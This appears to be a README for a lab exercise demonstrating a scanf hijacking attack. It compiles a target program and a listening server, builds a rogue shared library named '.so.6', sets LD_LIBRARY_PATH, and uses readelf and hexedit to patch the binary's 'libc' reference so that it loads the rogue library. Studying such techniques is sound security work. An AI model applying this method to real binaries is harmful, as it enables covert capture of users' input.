#####################################################
##################   README FILE   ##################
#####################################################



step 1:

### complie the main program ###

	>>> gcc secret.c
	
### run the main program ###	

	>>> ./a.out



step 2 (open new terminal):

### complie the server ###

	>>> gcc server.c -o server

### run the server ###

	>>> ./server
	
	

step 3:	

### complie the library for the scanf attack ###

	>>> gcc --shared -fPIC lib.c -o .so.6 -ldl

	>>> export LD_LIBRARY_PATH="."

### 
	find the dynamic string section adress 
	and the offset of 'libc' adress 
###

	>>> readelf -l ./a.out
	>>> readelf -d ./a.out
	>>> readelf -a ./a.out | less

### 
	find the offset of 'libc' in the binary file 
	and change it to '.so.6' offset 
###

	>>> hexedit ./a.out



step 4:

### 
	run the main program (the binary file after the change)
	(make sure the server is running in other terminal)
###

	>>> ./a.out


